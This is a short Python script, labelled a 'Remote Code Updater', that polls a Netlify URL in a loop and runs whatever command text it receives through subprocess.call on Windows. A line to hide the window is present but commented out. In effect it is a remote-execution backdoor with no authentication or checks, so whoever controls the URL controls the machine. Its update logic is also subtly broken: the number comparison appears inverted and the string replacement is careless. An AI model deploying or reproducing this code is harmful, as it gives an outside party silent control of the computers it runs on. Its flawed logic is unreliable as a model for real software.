#Remote Code Upadater
import os 
import requests
import subprocess
import time

script_id_number = 596

while True:
    #local command number scanner
    with open("new_command", "r") as local_command_scanner:
        local_command_scanner_var = local_command_scanner.readline()[0:4]
     
    

    new_command_url = f"https://rcu-d.netlify.app/order/{script_id_number}"
    new_command = requests.get(new_command_url).text

    #online loaded command code

    command_number_online = new_command[0:4]
    

    #cutting down the command number from main command

    new_command = new_command
    new_command = new_command.replace(command_number_online, "")
    
    
    if local_command_scanner_var == command_number_online:

        with open("new_command", "w") as command_container:
            command_container.write(str(new_command))
            command_container.close()
        loaded_command = open("new_command", "r").readline()
        loaded_command = str(loaded_command)

        print(loaded_command)
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        #si.wShowWindow = subprocess.SW_HIDE # default
        subprocess.call(loaded_command, startupinfo=si)
        print("Command Executed")
    else:
        print("No loaded Command")
        continue

    

